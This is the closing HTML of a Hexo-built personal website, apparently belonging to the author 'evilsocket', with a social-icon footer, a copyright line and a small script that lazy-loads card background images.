              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            </a>
          
        
          
        
          
            <a href="mailto:evilsocket@gmail.com" class="social-link" aria-label="Email">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
            </a>
          
        
      
    </div>
    <p class="footer-copyright">
      &copy; 2025 evilsocket. 
      Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>.
    </p>
  </div>
</footer>

  <!-- Minimal JS - no external dependencies needed -->
<script>
  // Lazy load images
  document.addEventListener('DOMContentLoaded', function() {
    var images = document.querySelectorAll('.card-image[data-bg]');
    images.forEach(function(img) {
      img.style.backgroundImage = 'url(' + img.dataset.bg + ')';
    });
  });
</script>

</body>
</html>
